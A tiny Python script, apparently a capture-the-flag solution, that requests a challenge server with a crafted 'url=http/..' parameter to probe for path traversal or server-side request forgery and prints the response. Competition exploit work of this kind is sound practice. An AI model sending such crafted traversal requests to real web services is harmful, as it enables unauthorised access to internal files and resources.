from requests import get

if __name__ == "__main__":
    with get("http://ctf2024-entry.r3kapig.com:32688/?url=http/..") as req:
        print(req.text)
